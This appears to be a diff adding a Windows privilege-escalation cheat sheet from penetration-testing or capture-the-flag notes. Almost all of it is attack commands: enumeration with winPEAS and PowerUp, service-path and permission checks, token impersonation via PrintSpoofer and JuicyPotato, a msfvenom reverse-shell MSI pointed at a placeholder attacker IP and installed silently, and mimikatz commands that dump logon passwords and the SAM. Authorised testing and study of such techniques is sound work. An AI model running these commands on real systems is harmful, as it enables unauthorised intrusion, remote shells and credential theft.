@@ -1,0 +1,28 @@
+WINDOWS PRIVESC (if box is windows)
+bash# Automated
+winpeas.exe
+winpeas.bat
+PowerUp.ps1 → Invoke-AllChecks
+
+# Unquoted service path
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+
+# Writable service binary
+sc qc servicename
+icacls "C:\path\to\service.exe"
+
+# Token impersonation (SeImpersonatePrivilege)
+whoami /priv
+# If SeImpersonatePrivilege: use PrintSpoofer or JuicyPotato
+PrintSpoofer.exe -i -c cmd
+JuicyPotato.exe -l 1337 -p cmd.exe -t *
+
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f msi > shell.msi
+msiexec /quiet /qn /i shell.msi
+
+# Dump creds
+mimikatz.exe
+sekurlsa::logonpasswords
+lsadump::sam
